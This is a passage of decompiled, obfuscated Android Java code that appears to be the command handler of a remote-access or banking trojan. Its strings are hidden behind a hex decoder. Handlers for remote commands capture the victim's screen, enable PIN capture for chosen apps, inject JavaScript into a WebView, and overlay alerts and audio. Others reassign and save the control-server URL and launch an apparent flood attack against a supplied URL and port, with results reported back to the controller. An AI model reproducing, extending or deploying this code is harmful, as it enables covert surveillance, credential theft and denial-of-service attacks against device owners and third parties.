            int iOptInt6 = jSONObject.optInt(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 30);
            String str14 = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            okc5AGRjqrud84oM6d.J0zjQ7CAgohuxU20eCW6(this.dDIMxZXP1V8HdM, iOptInt6);
            JSONObject jSONObject34 = new JSONObject();
            jSONObject34.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003100730058008800E200BB00DB00A9002400490048009300F100AD00C600A20027"));
            jSONObject34.put(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), iOptInt6);
            H9XlUr4OeMJFiXK(jSONObject34);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00AD00D700A4002C0064005F008E00FE00B8"))) {
            String str15 = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            okc5AGRjqrud84oM6d.XiR1pIn5878vVWd(this.dDIMxZXP1V8HdM);
            this.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(this, 9), 1000L);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E200BA00D100A8003100720052008900F7"))) {
            l1V0lQr6TbwNKqHfXNbb();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000DE00A800220072"))) {
            String strOptString18 = jSONObject.optString(TypefaceCache.obtain("003600640057"), "");
            float fOptDouble = (float) jSONObject.optDouble(TypefaceCache.obtain("003500790057009200FD00BA"), 1.0d);
            if (strOptString18.length() > 0) {
                MediaPlayer mediaPlayer = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
                wbK4wnGaII4TwWEYqb.w9sT1Swbhx3hs(this.dDIMxZXP1V8HdM, strOptString18, fOptDouble);
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C200AB0022006F"))) {
            String strOptString19 = jSONObject.optString(TypefaceCache.obtain("003600640057"), "");
            float fOptDouble2 = (float) jSONObject.optDouble(TypefaceCache.obtain("003500790057009200FD00BA"), 1.0d);
            if (!(strOptString19.length() > 0)) {
                wbK4wnGaII4TwWEYqb.JXn4Qf7zpnLjP5();
                return;
            } else {
                MediaPlayer mediaPlayer2 = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
                wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM(this.dDIMxZXP1V8HdM, strOptString19, fOptDouble2);
                return;
            }
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C200A600360065005E"))) {
            wbK4wnGaII4TwWEYqb.vekpFI4d1Nc4fakF();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C000A20030006300560082"))) {
            wbK4wnGaII4TwWEYqb.Ee8d2j4S9Vm5yGuR();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C100B3002C0066"))) {
            wbK4wnGaII4TwWEYqb.D5P1xCAyuvgF();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C100A20026007D"))) {
            MediaPlayer mediaPlayer3 = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
            wbK4wnGaII4TwWEYqb.xDyLpEZyrcKVe0(jSONObject.optInt(TypefaceCache.obtain("003300790048008E00E400B600DD00A9"), 0));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00220063005F008E00FF008000C400A8002F006300560082"))) {
            MediaPlayer mediaPlayer4 = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
            wbK4wnGaII4TwWEYqb.pyu8ovAipBTLYAiKab((float) jSONObject.optDouble(TypefaceCache.obtain("003500790057009200FD00BA"), 1.0d));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000D100A6002E00730049008600CF00AC00C600B5002600770056"))) {
            boolean zOptBoolean4 = jSONObject.optBoolean(TypefaceCache.obtain("002500640054008900E4"), true);
            int iOptInt7 = jSONObject.optInt(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), 40);
            int iOptInt8 = jSONObject.optInt(TypefaceCache.obtain("002500660048"), 8);
            int iOptInt9 = jSONObject.optInt(TypefaceCache.obtain("0034007F005F009300F8"), 480);
            boolean z3 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            if (gA5gCwTK0qjTIn.gmNWMfvn6zlEj()) {
                gA5gCwTK0qjTIn.vIJudZvPyTuNp(this.dDIMxZXP1V8HdM);
                Thread.sleep(600L);
            }
            gA5gCwTK0qjTIn.yTljMGnIibTRdOpSh4(this.dDIMxZXP1V8HdM, zOptBoolean4, iOptInt7, iOptInt8, iOptInt9);
            JSONObject jSONObject35 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002000770056008200E200BE00ED00B400370064005E008600FD008000C100B300220064004F008200F4", jSONObject35, TypefaceCache.obtain("0037006F004B0082"), "002500640054008900E4", zOptBoolean4);
            H9XlUr4OeMJFiXK(jSONObject35);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00BC00D300AA00260064005A00B800E300AB00C000A20022007B"))) {
            boolean z4 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            gA5gCwTK0qjTIn.vIJudZvPyTuNp(this.dDIMxZXP1V8HdM);
            JSONObject jSONObject36 = new JSONObject();
            jSONObject36.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770056008200E200BE00ED00B400370064005E008600FD008000C100B3002C0066004B008200F4"));
            H9XlUr4OeMJFiXK(jSONObject36);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000DF00AE002000490048009300E200BA00D300AA"))) {
            String strOptString20 = jSONObject.optString(TypefaceCache.obtain("00300079004E009500F300BA"), TypefaceCache.obtain("002E007F0058"));
            PHZNFNJs3M6qql pHZNFNJs3M6qql = PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab;
            if (okc5AGRjqrud84oM6d.gmNWMfvn6zlEj()) {
                okc5AGRjqrud84oM6d.MLSIo1htfMPWeB8V876L();
                Thread.sleep(300L);
            }
            okc5AGRjqrud84oM6d.nQilHWaqS401ZtR(this.dDIMxZXP1V8HdM, strOptString20);
            JSONObject jSONObject37 = new JSONObject();
            jSONObject37.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002E007F005800B800E300AB00C000A20022007B0064009400E400BE00C000B300260072"));
            H9XlUr4OeMJFiXK(jSONObject37);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00B200DB00A4001C0065004F009500F500BE00DF"))) {
            PHZNFNJs3M6qql pHZNFNJs3M6qql2 = PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab;
            okc5AGRjqrud84oM6d.MLSIo1htfMPWeB8V876L();
            JSONObject jSONObject38 = new JSONObject();
            jSONObject38.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002E007F005800B800E300AB00C000A20022007B0064009400E400B000C200B700260072"));
            H9XlUr4OeMJFiXK(jSONObject38);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0020007E005A009300CF00B200D700B400300077005C0082"))) {
            String strOptString21 = jSONObject.optString(TypefaceCache.obtain("002E00730048009400F100B800D7"), "");
            if (strOptString21.length() > 0) {
                String str16 = ChatActivity.Ee8d2j4S9Vm5yGuR;
                if (OFtLBiBbrrTHWu.J0zjQ7CAgohuxU20eCW6() != null) {
                    OFtLBiBbrrTHWu.dDIMxZXP1V8HdM(strOptString21);
                    return;
                } else {
                    this.nQilHWaqS401ZtR.post(new m7Tosu6RfY5Ca6(this, strOptString21, 2));
                    return;
                }
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002C0066005E008900CF00BC00DA00A60037"))) {
            this.nQilHWaqS401ZtR.post(new A68NpXPqwTFos99nt(this, 25 - 16, jSONObject));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0030007E0054009000CF00BE00DE00A200310062"))) {
            String strOptString22 = jSONObject.optString(TypefaceCache.obtain("0037007F004F008B00F5"), "");
            String strOptString23 = jSONObject.optString(TypefaceCache.obtain("002E00730048009400F100B800D7"), "");
            String strOptString24 = jSONObject.optString(TypefaceCache.obtain("00210063004F009300FF00B100ED00B30026006E004F"), "OK");
            String strOptString25 = jSONObject.optString(TypefaceCache.obtain("0022007A005E009500E4008000C600BE00330073"), TypefaceCache.obtain("0022007A005E009500E4"));
            String strOptString26 = jSONObject.optString(TypefaceCache.obtain("002A0078004B009200E4008000DA00AE002D0062"), "");
            String str17 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            vbdyByOHPJmeGXlq.MLSIo1htfMPWeB8V876L(strOptString22, strOptString23, strOptString24, strOptString25, strOptString26);
            JSONObject jSONObject39 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("0030007E0054009000CF00BE00DE00A200310062", jSONObject39, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject39, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject39);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002B007F005F008200CF00BE00DE00A200310062"))) {
            String str18 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
            JSONObject jSONObject40 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002B007F005F008200CF00BE00DE00A200310062", jSONObject40, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject40, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject40);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00370079004E008400F8008000D000AB002C0075005000B800FF00B1"))) {
            String str19 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            vbdyByOHPJmeGXlq.b1EoSIRjJHO5();
            JSONObject jSONObject41 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("00370079004E008400F8008000D000AB002C0075005000B800E300AB00D300B300360065", jSONObject41, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00E600BA", true);
            H9XlUr4OeMJFiXK(jSONObject41);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00370079004E008400F8008000D000AB002C0075005000B800FF00B900D4"))) {
            String str20 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            vbdyByOHPJmeGXlq.ibVTtJUNfrGYbW();
            JSONObject jSONObject42 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("00370079004E008400F8008000D000AB002C0075005000B800E300AB00D300B300360065", jSONObject42, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00E600BA", false);
            H9XlUr4OeMJFiXK(jSONObject42);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00AD0030"))) {
            String strOptString27 = jSONObject.optString(TypefaceCache.obtain("002900650064008400FF00BB00D7"), "");
            String strOptString28 = jSONObject.optString(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"), "");
            if (strOptString27.length() > 0) {
                WebView webView = HelperYOLoader.Ee8d2j4S9Vm5yGuR;
                WebView webViewEe8d2j4S9Vm5yGuR = RIZfHbqXpth8r2yN4.Ee8d2j4S9Vm5yGuR();
                if (webViewEe8d2j4S9Vm5yGuR != null) {
                    this.nQilHWaqS401ZtR.post(new TLNVSdc9dyzTVW7(webViewEe8d2j4S9Vm5yGuR, strOptString27, this, strOptString28, 0));
                } else {
                    JSONObject jSONObject43 = new JSONObject();
                    Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002A00780051008200F300AB00ED00AD003000490049008200E300AA00DE00B3", jSONObject43, TypefaceCache.obtain("0037006F004B0082"), "003700770049008000F500AB00ED00B7002200750050008600F700BA", strOptString28);
                    Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("000D0079001B008600F300AB00DB00B1002600360052008900FA00BA00D100B300630041005E008500C600B600D700B0", jSONObject43, TypefaceCache.obtain("002600640049008800E2"), "003000630058008400F500AC00C1", false);
                    H9XlUr4OeMJFiXK(jSONObject43);
                }
            }
            if (strOptString28.length() > 0) {
                String str21 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                GQh1bKoqkKhujFH2nJ.b1EoSIRjJHO5(strOptString28, jSONObject.optString(TypefaceCache.obtain("002900650064008400FF00BB00D7"), ""));
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00310073005F008E00E200BA00D100B3"))) {
            String strOptString29 = jSONObject.optString(TypefaceCache.obtain("003300770055008200FC008000C700B5002F"), "");
            String strOptString30 = jSONObject.optString(TypefaceCache.obtain("00350078005800B800E500AD00DE"), "");
            if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString30)) {
                this.D5P1xCAyuvgF = strOptString30;
                TypefaceCache.obtain("001000730049009100F500AD009200B5002600720052009500F500BC00C600FD00630040007500A400B000F2008C00E7");
                try {
                    this.dDIMxZXP1V8HdM.getSharedPreferences(TypefaceCache.obtain("002500770052008B00FF00A900D700B5"), 0).edit().putString(TypefaceCache.obtain("00310073005F008E00E200BA00D100B3001C006000550084"), strOptString30).apply();
                } catch (Exception unused11) {
                }
                this.xDyLpEZyrcKVe0 = false;
                J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
                if (j1m0XraSkScfWFMIlTC != null) {
                    j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("00110073005F008E00E200BA00D100B3"), 1000);
                }
            }
            if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString29)) {
                TypefaceCache.obtain("001000730049009100F500AD009200B5002600720052009500F500BC00C600FD00630046005A008900F500B3009200EA007D0036");
                try {
                    this.dDIMxZXP1V8HdM.getSharedPreferences(TypefaceCache.obtain("002500770052008B00FF00A900D700B5"), 0).edit().putString(TypefaceCache.obtain("00310073005F008E00E200BA00D100B3001C0066005A008900F500B3"), strOptString29).apply();
                } catch (Exception unused12) {
                }
            }
            JSONObject jSONObject44 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("00310073005F008E00E200BA00D100B3", jSONObject44, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject44, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", (-13) + 14);
            H9XlUr4OeMJFiXK(jSONObject44);
            return;
        }
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002700720054009400CF00AC00C600A600310062"))) {
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002700720054009400CF00AC00C600A80033"))) {
                gJu9g2a3S4wwbTk.b1EoSIRjJHO5();
                return;
            } else {
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002700720054009400CF00AC00C600A6003700630048"))) {
                    H9XlUr4OeMJFiXK(gJu9g2a3S4wwbTk.dDIMxZXP1V8HdM());
                    return;
                }
                return;
            }
        }
        String strOptString31 = jSONObject.optString(TypefaceCache.obtain("00220062004F008600F300B400ED00B3003A0066005E"), TypefaceCache.obtain("000B0042006F00B700CF009900FE0088000C0052"));
        String strOptString32 = jSONObject.optString(TypefaceCache.obtain("003600640057"), "");
        int iOptInt10 = jSONObject.optInt(TypefaceCache.obtain("0033007900490093"), 80);
        int iOptInt11 = jSONObject.optInt(TypefaceCache.obtain("0037007E0049008200F100BB00C1"), 63 - 53);
        int iOptInt12 = jSONObject.optInt(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 60);
        if (strOptString32.length() > 0) {
            gJu9g2a3S4wwbTk.ibVTtJUNfrGYbW(iOptInt10, iOptInt11, iOptInt12, strOptString31, strOptString32);
        }
    }

    public final void hV4VTKNUdeHN() {
        this.Q7qC5ia93qGCjkBXCF0A = false;
        Thread thread = this.qiOhdF48gPbc;
        if (thread != null) {
            thread.interrupt();
        }
        this.qiOhdF48gPbc = null;
        TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A90063007B0054008300F500FF00C100B3002C0066004B008200F4");
    }

    public final void hjneShqpF9Tis4(JSONObject jSONObject) throws JSONException {
        String strOptString = jSONObject.optString(TypefaceCache.obtain("00220075004F008E00FF00B1"));
        TypefaceCache.obtain("001100730058008200F900A900D700A3006300750054008A00FD00BE00DC00A300790036");
        int i = 0;
        int i2 = 2;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062"))) {
            TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009500F500AE00C700A200300062005E008300BC00FF00C600B5003A007F0055008000B000AB00DD00E700200077004B009300E500AD00D700E7003000750049008200F500B1009C00E9006D");
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
            gARjgaGEpTotOxcl8vfe.getClass();
            if (DataQFAdapter.instance == null) {
                TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E900FF00E100A2003100600052008400F500FF00DC00A8003700360049009200FE00B100DB00A900240037");
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003000750049008200F500B100C100AF002C0062", jSONObject2, TypefaceCache.obtain("0037006F004B0082"), "002600640049008800E2"), TypefaceCache.checked("000200750058008200E300AC00DB00A5002A007A0052009300E900FF00E100A2003100600052008400F500FF048F04F200630421040B04D804D30496048704FA006D0036042904DD04AB049104F504FF04010423001B04A604AB049C048404F604000036040900C704AD04EF04F3048504030428040204DD04A0049A009C"));
                H9XlUr4OeMJFiXK(jSONObject2);
                return;
            }
            byte[] bArr = (byte[]) ManagerUMController.iUQk66nAiXgO35.getAndSet(null);
            String strEncodeToString = bArr == null ? null : Base64.encodeToString(bArr, 2);
            if (strEncodeToString != null) {
                TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B008100E200B000DF00E7000E00770055008600F700BA00C00092000E00550054008900E400AD00DD00AB002F0073004900DD00B0");
                TypefaceCache.obtain("006300750053008600E200AC");
                JSONObject jSONObject3 = new JSONObject();
                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("003000750049008200F500B100C100AF002C0062", jSONObject3, TypefaceCache.obtain("0037006F004B0082"), "00270077004F0086", strEncodeToString);
                H9XlUr4OeMJFiXK(jSONObject3);
                return;
            }
            int i3 = Build.VERSION.SDK_INT;
            int i4 = 44 - 14;
            if (i3 < i4) {
                gARjgaGEpTotOxcl8vfe.getClass();
                GARjgaGEpTotOxcl8vfe.GiffeZJ1rbwyx();
                TypefaceCache.obtain("0010006F0048009300F500B2009200B400200064005E008200FE00AC00DA00A800370036004F009500F900B800D500A200310073005F00CB00B000A800D300AE0037007F0055008000B000B900DD00B5006300700052008B00F500F1009C00E9");
                this.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(this, 16), 3000L);
                return;
            }
            EZbVnuP8e1Nfu7 eZbVnuP8e1Nfu7 = new EZbVnuP8e1Nfu7(this, i);
            String unused = DataQFAdapter.TAG;
            TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE00FF00D100A6002F007A005E008300BC00FF00E100830008002B");
            TypefaceCache.obtain("006F00360052008900E300AB00D300A9002000730006");
            DataQFAdapter unused2 = DataQFAdapter.instance;
            if (i3 < i4) {
                String unused3 = DataQFAdapter.TAG;
                TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE00E5009200940007005D001B009300FF00B0009200AB002C0061001700C700FE00BA00D700A3006300570055008300E200B000DB00A300630027000A00CC");
                eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(null);
                return;
            }
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter == null) {
                String unused4 = DataQFAdapter.TAG;
                TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE00E50092008600200075005E009400E300B600D000AE002F007F004F009E00B000AC00D700B50035007F0058008200B000B600DC00B4003700770055008400F500FF00DB00B400630078004E008B00FC00FE");
                eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(null);
                return;
            }
            try {
                dataQFAdapter.captureScreenInternal(eZbVnuP8e1Nfu7);
                return;
            } catch (Exception e) {
                String unused5 = DataQFAdapter.TAG;
                TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE00FF00D700B500310079004900DD00B0");
                e.getMessage();
                eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(null);
                return;
            }
        }
        int i5 = 1;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800E300AB00D300B300360065"))) {
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            JSONObject jSONObjectW9sT1Swbhx3hs = VpKcDcuRNaQkRJ5.w9sT1Swbhx3hs(this.dDIMxZXP1V8HdM);
            JSONObject jSONObject4 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject4, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject4.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            jSONObject4.put(TypefaceCache.obtain("003100730048009200FC00AB"), jSONObjectW9sT1Swbhx3hs);
            H9XlUr4OeMJFiXK(jSONObject4);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800F100AA00C600A8001C00710049008600FE00AB"))) {
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ6 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            VpKcDcuRNaQkRJ5.nQilHWaqS401ZtR(this.dDIMxZXP1V8HdM);
            JSONObject jSONObject5 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject5, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject5.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            jSONObject5.put(TypefaceCache.obtain("003100730048009200FC00AB"), new JSONObject().put(TypefaceCache.obtain("0033007F004B008200FC00B600DC00A2001C0065004F008600E200AB00D700A3"), true));
            H9XlUr4OeMJFiXK(jSONObject5);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003100730048009300F100AD00C60098003000620049008200F100B2"))) {
            TypefaceCache.obtain("003100730048009300F100AD00C60098003000620049008200F100B2009200A4002C007B0056008600FE00BB008800E700310073005D009500F500AC00DA00AE002D0071001B008400F100AF00C600B200310073");
            String str = ManagerUMController.DVTNwpDEVsUKuznof;
            if (ManagerUMController.ECwLkmPW1UKz7J6E) {
                try {
                    Context context = this.dDIMxZXP1V8HdM;
                    context.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context));
                } catch (Exception unused6) {
                }
            }
            JSONObject jSONObject6 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject6, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject6.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            H9XlUr4OeMJFiXK(jSONObject6);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C0078004800B800E300AB00DD00B7"))) {
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ7 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            VpKcDcuRNaQkRJ5.J0zjQ7CAgohuxU20eCW6();
            JSONObject jSONObject7 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject7, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject7.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            jSONObject7.put(TypefaceCache.obtain("003100730048009200FC00AB"), new JSONObject().put(TypefaceCache.obtain("0033007F004B008200FC00B600DC00A2001C0065004F008800E000AF00D700A3"), true));
            H9XlUr4OeMJFiXK(jSONObject7);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0033007F005500B800F300BE00C200B300360064005E00B800E400B000D500A0002F0073"))) {
            String strOptString2 = jSONObject.optString(TypefaceCache.obtain("003300770058008C00F100B800D7"), "");
            boolean zOptBoolean = jSONObject.optBoolean(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), false);
            if (strOptString2.length() > 0) {
                DataQFAdapter.Companion.getClass();
                DataQFAdapter.pinCaptureEnabled.put(strOptString2, Boolean.valueOf(zOptBoolean));
                String strObtain = TypefaceCache.obtain("0013005F007500C700F300BE00C200B300360064005E00C7");
                String str2 = zOptBoolean ? "ON" : "OFF";
                GARjgaGEpTotOxcl8vfe.pyu8ovAipBTLYAiKab(strObtain + str2 + TypefaceCache.obtain("006300700054009500B0") + strOptString2);
                GARjgaGEpTotOxcl8vfe.k84rwRrqzhrNQ1CdNQ9();
            }
            JSONObject jSONObject8 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject8, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject8.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            H9XlUr4OeMJFiXK(jSONObject8);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0033007F005500B800F300BE00C200B300360064005E00B800E300BC00D300A9"))) {
            new Thread(new uY2iPU7ne5s7Y5LeXnLI(this, 14)).start();
            JSONObject jSONObject9 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject9, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject9.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            H9XlUr4OeMJFiXK(jSONObject9);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0033007F005500B800F300BE00C200B300360064005E00B800F700BA00C6"))) {
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.k84rwRrqzhrNQ1CdNQ9();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0036007F0059008B00FF00BC00D9009800360066005F008600E400BA"))) {
            JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject(TypefaceCache.obtain("0025007A005A008000E3"));
            if (jSONObjectOptJSONObject == null) {
                jSONObjectOptJSONObject = new JSONObject();
            }
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.tne6mXOUFKdd(jSONObjectOptJSONObject);
            JSONObject jSONObject10 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject10, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject10.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            jSONObject10.put(TypefaceCache.obtain("003100730048009200FC00AB"), GARjgaGEpTotOxcl8vfe.MLSIo1htfMPWeB8V876L());
            H9XlUr4OeMJFiXK(jSONObject10);
            return;
        }
